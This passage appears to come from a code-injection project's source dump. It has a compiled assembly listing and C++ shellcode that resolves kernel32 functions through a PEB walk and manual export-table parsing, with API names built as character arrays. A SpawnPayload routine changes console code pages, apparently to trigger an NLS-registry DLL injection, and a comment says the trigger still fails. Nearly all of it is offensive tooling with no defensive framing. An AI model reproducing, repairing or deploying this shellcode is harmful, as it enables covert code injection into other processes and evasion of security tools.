	ret	0
?SpawnPayload@@YAXPEAKAEAUkernel32Iat@@@Z ENDP		; SpawnPayload
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
set_console_cp_name$ = 32
alloc_console_name$ = 48
get_proc_name$ = 64
get_console_window_name$ = 80
set_console_output_cp_name$ = 104
set_Thread_UI_language_Name$ = 128
baseAddrKernel32$ = 152
kernel32_dll_name$ = 160
get_proc$ = 192
iat$ = 224
?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z PROC	; initializeIatShellcode
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\ShellcodeInjection.cpp
; Line 7
$LN10:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 216				; 000000d8H
; Line 8
	mov	eax, 107				; 0000006bH
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
; Line 9
	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
	call	?GetModuleByName@@YAPEAXPEA_W@Z		; GetModuleByName
	mov	QWORD PTR baseAddrKernel32$[rsp], rax
; Line 10
	cmp	QWORD PTR baseAddrKernel32$[rsp], 0
	jne	SHORT $LN2@initialize
; Line 11
	mov	eax, 1
	jmp	$LN1@initialize
$LN2@initialize:
; Line 13
	mov	BYTE PTR get_proc_name$[rsp], 71	; 00000047H
	mov	BYTE PTR get_proc_name$[rsp+1], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+2], 116	; 00000074H
	mov	BYTE PTR get_proc_name$[rsp+3], 80	; 00000050H
	mov	BYTE PTR get_proc_name$[rsp+4], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+5], 111	; 0000006fH
	mov	BYTE PTR get_proc_name$[rsp+6], 99	; 00000063H
	mov	BYTE PTR get_proc_name$[rsp+7], 65	; 00000041H
	mov	BYTE PTR get_proc_name$[rsp+8], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+9], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+10], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+11], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+12], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+13], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+14], 0
; Line 14
	lea	rdx, QWORD PTR get_proc_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	call	?GetFunctionByName@@YAPEAXPEAXPEAD@Z	; GetFunctionByName
	mov	QWORD PTR get_proc$[rsp], rax
; Line 15
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN3@initialize
; Line 16
	mov	eax, 3
	jmp	$LN1@initialize
$LN3@initialize:
; Line 18
	mov	rax, QWORD PTR iat$[rsp]
	mov	rcx, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR [rax+40], rcx
; Line 20
	mov	BYTE PTR get_console_window_name$[rsp], 71 ; 00000047H
	mov	BYTE PTR get_console_window_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR get_console_window_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR get_console_window_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR get_console_window_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR get_console_window_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR get_console_window_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR get_console_window_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR get_console_window_name$[rsp+10], 87 ; 00000057H
	mov	BYTE PTR get_console_window_name$[rsp+11], 105 ; 00000069H
	mov	BYTE PTR get_console_window_name$[rsp+12], 110 ; 0000006eH
	mov	BYTE PTR get_console_window_name$[rsp+13], 100 ; 00000064H
	mov	BYTE PTR get_console_window_name$[rsp+14], 111 ; 0000006fH
	mov	BYTE PTR get_console_window_name$[rsp+15], 119 ; 00000077H
	mov	BYTE PTR get_console_window_name$[rsp+16], 0
; Line 21
	mov	BYTE PTR alloc_console_name$[rsp], 65	; 00000041H
	mov	BYTE PTR alloc_console_name$[rsp+1], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+2], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+3], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+4], 99	; 00000063H
	mov	BYTE PTR alloc_console_name$[rsp+5], 67	; 00000043H
	mov	BYTE PTR alloc_console_name$[rsp+6], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+7], 110 ; 0000006eH
	mov	BYTE PTR alloc_console_name$[rsp+8], 115 ; 00000073H
	mov	BYTE PTR alloc_console_name$[rsp+9], 111 ; 0000006fH
	mov	BYTE PTR alloc_console_name$[rsp+10], 108 ; 0000006cH
	mov	BYTE PTR alloc_console_name$[rsp+11], 101 ; 00000065H
	mov	BYTE PTR alloc_console_name$[rsp+12], 0
; Line 22
	mov	BYTE PTR set_console_cp_name$[rsp], 83	; 00000053H
	mov	BYTE PTR set_console_cp_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_console_cp_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_console_cp_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR set_console_cp_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR set_console_cp_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR set_console_cp_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR set_console_cp_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR set_console_cp_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR set_console_cp_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR set_console_cp_name$[rsp+10], 67 ; 00000043H
	mov	BYTE PTR set_console_cp_name$[rsp+11], 80 ; 00000050H
	mov	BYTE PTR set_console_cp_name$[rsp+12], 0
; Line 23
	mov	BYTE PTR set_console_output_cp_name$[rsp], 83 ; 00000053H
	mov	BYTE PTR set_console_output_cp_name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_console_output_cp_name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+3], 67 ; 00000043H
	mov	BYTE PTR set_console_output_cp_name$[rsp+4], 111 ; 0000006fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+5], 110 ; 0000006eH
	mov	BYTE PTR set_console_output_cp_name$[rsp+6], 115 ; 00000073H
	mov	BYTE PTR set_console_output_cp_name$[rsp+7], 111 ; 0000006fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+8], 108 ; 0000006cH
	mov	BYTE PTR set_console_output_cp_name$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR set_console_output_cp_name$[rsp+10], 79 ; 0000004fH
	mov	BYTE PTR set_console_output_cp_name$[rsp+11], 117 ; 00000075H
	mov	BYTE PTR set_console_output_cp_name$[rsp+12], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+13], 112 ; 00000070H
	mov	BYTE PTR set_console_output_cp_name$[rsp+14], 117 ; 00000075H
	mov	BYTE PTR set_console_output_cp_name$[rsp+15], 116 ; 00000074H
	mov	BYTE PTR set_console_output_cp_name$[rsp+16], 67 ; 00000043H
	mov	BYTE PTR set_console_output_cp_name$[rsp+17], 80 ; 00000050H
	mov	BYTE PTR set_console_output_cp_name$[rsp+18], 0
; Line 24
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp], 83 ; 00000053H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+1], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+2], 116 ; 00000074H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+3], 84 ; 00000054H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+4], 104 ; 00000068H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+5], 114 ; 00000072H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+6], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+7], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+8], 100 ; 00000064H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+9], 85 ; 00000055H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+10], 73 ; 00000049H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+11], 76 ; 0000004cH
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+12], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+13], 110 ; 0000006eH
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+14], 103 ; 00000067H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+15], 117 ; 00000075H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+16], 97 ; 00000061H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+17], 103 ; 00000067H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+18], 101 ; 00000065H
	mov	BYTE PTR set_Thread_UI_language_Name$[rsp+19], 0
; Line 26
	lea	rdx, QWORD PTR set_console_output_cp_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx], rax
; Line 27
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	SHORT $LN4@initialize
; Line 28
	mov	eax, 4
	jmp	$LN1@initialize
$LN4@initialize:
; Line 30
	lea	rdx, QWORD PTR get_console_window_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+8], rax
; Line 31
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+8], 0
	jne	SHORT $LN5@initialize
; Line 32
	mov	eax, 5
	jmp	$LN1@initialize
$LN5@initialize:
; Line 34
	lea	rdx, QWORD PTR set_console_cp_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+16], rax
; Line 35
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+16], 0
	jne	SHORT $LN6@initialize
; Line 36
	mov	eax, 6
	jmp	SHORT $LN1@initialize
$LN6@initialize:
; Line 38
	lea	rdx, QWORD PTR alloc_console_name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+24], rax
; Line 39
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+24], 0
	jne	SHORT $LN7@initialize
; Line 40
	mov	eax, 7
	jmp	SHORT $LN1@initialize
$LN7@initialize:
; Line 42
	lea	rdx, QWORD PTR set_Thread_UI_language_Name$[rsp]
	mov	rcx, QWORD PTR baseAddrKernel32$[rsp]
	mov	rax, QWORD PTR iat$[rsp]
	call	QWORD PTR [rax+40]
	mov	rcx, QWORD PTR iat$[rsp]
	mov	QWORD PTR [rcx+32], rax
; Line 43
	mov	rax, QWORD PTR iat$[rsp]
	cmp	QWORD PTR [rax+32], 0
	jne	SHORT $LN8@initialize
; Line 44
	mov	eax, 8
	jmp	SHORT $LN1@initialize
$LN8@initialize:
; Line 46
	xor	eax, eax
$LN1@initialize:
; Line 47
	add	rsp, 216				; 000000d8H
	ret	0
?initializeIatShellcode@@YAIAEAUkernel32Iat@@@Z ENDP	; initializeIatShellcode
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?GetFunctionByName@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?GetFunctionByName@@YAPEAXPEAXPEAD@Z PROC		; GetFunctionByName, COMDAT
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\defs.h
; Line 68
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 69
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 70
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@GetFunctio
; Line 71
	xor	eax, eax
	jmp	$LN1@GetFunctio
$LN8@GetFunctio:
; Line 73
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 74
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 75
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@GetFunctio
; Line 76
	xor	eax, eax
	jmp	$LN1@GetFunctio
$LN9@GetFunctio:
; Line 79
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 80
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 81
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 83
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 84
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 85
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 88
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@GetFunctio
$LN2@GetFunctio:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@GetFunctio:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@GetFunctio
; Line 89
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 90
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 91
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 93
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 95
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@GetFunctio
$LN5@GetFunctio:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@GetFunctio:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@GetFunctio
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@GetFunctio
; Line 96
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@GetFunctio
	jmp	SHORT $LN6@GetFunctio
$LN10@GetFunctio:
; Line 97
	jmp	SHORT $LN5@GetFunctio
$LN6@GetFunctio:
; Line 98
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@GetFunctio
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@GetFunctio
; Line 100
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@GetFunctio
$LN11@GetFunctio:
; Line 102
	jmp	$LN2@GetFunctio
$LN3@GetFunctio:
; Line 103
	xor	eax, eax
$LN1@GetFunctio:
; Line 104
	add	rsp, 120				; 00000078H
	ret	0
?GetFunctionByName@@YAPEAXPEAXPEAD@Z ENDP		; GetFunctionByName
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?GetModuleByName@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv141 = 8
tv160 = 10
curr_name$2 = 16
c1$3 = 24
c2$4 = 28
tv137 = 32
tv156 = 36
entry$5 = 40
current$6 = 48
head$ = 56
peb$ = 64
ldr$ = 72
module_name$ = 96
?GetModuleByName@@YAPEAXPEA_W@Z PROC			; GetModuleByName, COMDAT
; File C:\Users\USER\source\repos\NLSRegistryCodeInjection\ShellcodeInjection\defs.h
; Line 30
$LN20:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H
; Line 33
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 37
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 39
	mov	rax, QWORD PTR ldr$[rsp]
	add	rax, 32					; 00000020H
	mov	QWORD PTR head$[rsp], rax
; Line 40
	mov	rax, QWORD PTR head$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
	jmp	SHORT $LN4@GetModuleB
$LN2@GetModuleB:
	mov	rax, QWORD PTR current$6[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR current$6[rsp], rax
$LN4@GetModuleB:
	mov	rax, QWORD PTR head$[rsp]
	cmp	QWORD PTR current$6[rsp], rax
	je	$LN3@GetModuleB
; Line 41
	mov	rax, QWORD PTR current$6[rsp]
	sub	rax, 16
	mov	QWORD PTR entry$5[rsp], rax
; Line 42
	cmp	QWORD PTR entry$5[rsp], 0
	je	SHORT $LN9@GetModuleB
	mov	rax, QWORD PTR entry$5[rsp]
	cmp	QWORD PTR [rax+48], 0
	jne	SHORT $LN8@GetModuleB
$LN9@GetModuleB:
	jmp	$LN3@GetModuleB
$LN8@GetModuleB:
; Line 44
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$2[rsp], rax
; Line 45
	cmp	QWORD PTR curr_name$2[rsp], 0
	jne	SHORT $LN10@GetModuleB
	jmp	SHORT $LN2@GetModuleB
$LN10@GetModuleB:
; Line 48
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN7@GetModuleB
$LN5@GetModuleB:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN7@GetModuleB:
	mov	rax, QWORD PTR entry$5[rsp]
	movzx	eax, WORD PTR [rax+88]
	cmp	QWORD PTR i$1[rsp], rax
	jae	$LN6@GetModuleB
; Line 50
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	SHORT $LN12@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN11@GetModuleB
$LN12@GetModuleB:
; Line 51
	jmp	$LN6@GetModuleB
$LN11@GetModuleB:
; Line 54
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN16@GetModuleB
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN16@GetModuleB
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv137[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv137[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv137[rsp]
	mov	WORD PTR tv141[rsp], ax
	jmp	SHORT $LN17@GetModuleB
$LN16@GetModuleB:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv141[rsp], ax
$LN17@GetModuleB:
	movzx	eax, WORD PTR tv141[rsp]
	mov	WORD PTR c1$3[rsp], ax
; Line 55
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN18@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN18@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv156[rsp], eax
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv156[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv156[rsp]
	mov	WORD PTR tv160[rsp], ax
	jmp	SHORT $LN19@GetModuleB
$LN18@GetModuleB:
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv160[rsp], ax
$LN19@GetModuleB:
	movzx	eax, WORD PTR tv160[rsp]
	mov	WORD PTR c2$4[rsp], ax
; Line 56
	movzx	eax, WORD PTR c1$3[rsp]
	movzx	ecx, WORD PTR c2$4[rsp]
	cmp	eax, ecx
	je	SHORT $LN13@GetModuleB
	jmp	SHORT $LN6@GetModuleB
$LN13@GetModuleB:
; Line 57
	jmp	$LN5@GetModuleB
$LN6@GetModuleB:
; Line 59
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@GetModuleB
; Line 60
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@GetModuleB
$LN14@GetModuleB:
; Line 62
	jmp	$LN2@GetModuleB
$LN3@GetModuleB:
; Line 64
	xor	eax, eax
$LN1@GetModuleB:
; Line 65
	add	rsp, 88					; 00000058H
	ret	0
?GetModuleByName@@YAPEAXPEA_W@Z ENDP			; GetModuleByName
_TEXT	ENDS
END

```

`ShellcodeInjection/ShellcodeInjection.cpp`:

```cpp
// ShellcodeInjection.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//
#include "defs.h"

UINT initializeIatShellcode(kernel32Iat& iat)
{
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
    LPVOID baseAddrKernel32 = GetModuleByName(kernel32_dll_name);
    if (!baseAddrKernel32) {
        return 1;
    }
    char get_proc_name[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
    LPVOID get_proc = GetFunctionByName((HMODULE)baseAddrKernel32, (LPSTR)get_proc_name);
    if (!get_proc) {
        return 3;
    }
    iat._GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

    char get_console_window_name[] = { 'G','e','t','C','o','n','s','o','l','e','W','i','n','d','o','w',0 };
    char alloc_console_name[] = { 'A','l','l','o','c','C','o','n','s','o','l','e',0 };
    char set_console_cp_name[] = { 'S','e','t','C','o','n','s','o','l','e','C','P',0 };
    char set_console_output_cp_name[] = { 'S','e','t','C','o','n','s','o','l','e','O','u','t','p','u','t','C','P',0 };
    char set_Thread_UI_language_Name[] = { 'S','e','t','T', 'h', 'r','e','a','d', 'U','I', 'L', 'a','n','g','u','a','g','e', 0 };

    iat._SetConsoleOutputCP = (BOOL(WINAPI * )(UINT))iat._GetProcAddress((HMODULE)baseAddrKernel32, set_console_output_cp_name);
    if (!iat._SetConsoleOutputCP) {
        return 4;
    }
    iat._GetConsoleWindow = (HWND(WINAPI * )()) iat._GetProcAddress((HMODULE)baseAddrKernel32, get_console_window_name);
    if (!iat._GetConsoleWindow) {
        return 5;
    }
    iat._SetConsoleCP = (BOOL(WINAPI * )(UINT))iat._GetProcAddress((HMODULE)baseAddrKernel32, set_console_cp_name);
    if (!iat._SetConsoleCP) {
        return 6;
    }
    iat._AllocConsole = (BOOL(WINAPI* )()) iat._GetProcAddress((HMODULE)baseAddrKernel32, alloc_console_name);
    if (!iat._AllocConsole) {
        return 7;
    }
    iat._SetThreadUILanguage = (LANGID(WINAPI *)(LANGID))iat._GetProcAddress((HMODULE)baseAddrKernel32, set_Thread_UI_language_Name);
    if (!iat._SetThreadUILanguage) {
        return 8;
    }
    return 0;
}

//Fix this payload trigger, it fails!
void SpawnPayload(DWORD* dwCodePageId, kernel32Iat& iat)
{
    DWORD dwCodePageID = *dwCodePageId;
    if (!iat._GetConsoleWindow())
    {
        if (!iat._AllocConsole()) {
            return;
        }
    }
    //Shellcode fails here.
    if (!iat._SetConsoleOutputCP(dwCodePageID)){
        return;
    }
    if (!iat._SetConsoleCP(dwCodePageID)){
        return;
    }
    iat._SetThreadUILanguage(0);
}

